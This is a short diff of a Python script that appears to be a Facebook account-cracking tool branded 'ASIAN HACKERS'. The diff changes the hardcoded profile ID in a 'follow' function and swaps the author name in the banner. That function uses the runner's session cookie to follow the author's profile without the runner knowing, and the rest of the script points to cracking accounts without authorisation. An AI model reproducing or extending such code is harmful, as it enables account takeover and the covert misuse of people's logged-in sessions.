@@ -117,7 +117,7 @@ def cek_apk(session,coki):
             print('')
  
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100028315179402', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://free.facebook.com' + str(get), {
@@ -183,7 +183,7 @@ logo =                                          f"""{H}
 \033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 10.00\033[1;31m 
 \033[1;37mMESSENGER GROUP ASIAN HACKERS{ M }\033[1;37m 
 \033[1;92m==========================================================
-\033[33;44m NAME YAD SATYE HAROON ARMAN \033[0;m
+\033[33;44m NAME YAD SATYE Raziqullah Saadat \033[0;m
 \033[1;92m=========================================================="""      
 loop = 0
 oks = []
